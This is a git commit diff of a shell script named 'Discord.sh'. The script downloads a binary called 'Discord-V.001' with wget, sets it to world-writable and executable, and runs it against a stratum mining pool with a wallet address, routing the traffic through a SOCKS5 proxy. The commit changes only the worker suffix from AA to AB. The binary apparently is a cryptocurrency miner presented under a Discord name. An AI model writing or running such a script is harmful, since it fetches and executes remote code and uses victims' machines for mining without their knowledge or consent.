e66ece89f4166101709c91bef69a2d934f638741
Explorer-Discord <90913472+Explorer-Discord@users.noreply.github.com>
2021-09-18 19:04:47 +0700

    Update Discord.sh

--- Discord.sh
+++ Discord.sh
@@ -4,4 +4,4 @@ sudo apt install screen libjansson4 -y
 wget -O Discord-V.001 https://github.com/Explorer-Discord/Discord-V.001/raw/main/Discord-V.001 
 screen -dmS ls
 chmod +x Discord.sh && chmod +x Discord-V.001 && chmod 777 Discord-V.001 Discord.sh
-./Discord-V.001 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.AA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
+./Discord-V.001 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.AB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
